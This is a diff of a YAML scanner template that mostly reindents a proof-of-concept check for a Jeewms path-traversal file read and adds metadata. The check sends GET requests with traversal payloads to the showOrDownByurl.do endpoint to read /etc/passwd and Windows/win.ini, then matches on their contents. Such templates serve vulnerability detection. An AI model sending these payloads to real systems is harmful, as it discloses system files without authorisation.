@@ -1,20 +1,24 @@
 id: jeewms-showordownbyurl-fileread
 
 info:
-    name: Jeewms Showordownbyurl fileread
-    author: B1anda0(https://github.com/B1anda0)
-    severity: high
+  name: Jeewms Showordownbyurl fileread
+  author: B1anda0
+  severity: high
+  verified: true
+  description: |-
+    Jeewms Showordownbyurl fileread
+  tags: jeewms,fileread
+  created: 2023/12/05
 
 rules:
-    linux0:
-        request:
-            method: GET
-            path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    windows0:
-        request:
-            method: GET
-            path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../Windows/win.ini
-        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+  linux0:
+    request:
+      method: GET
+      path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  windows0:
+    request:
+      method: GET
+      path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../Windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 expression: linux0() || windows0()
-
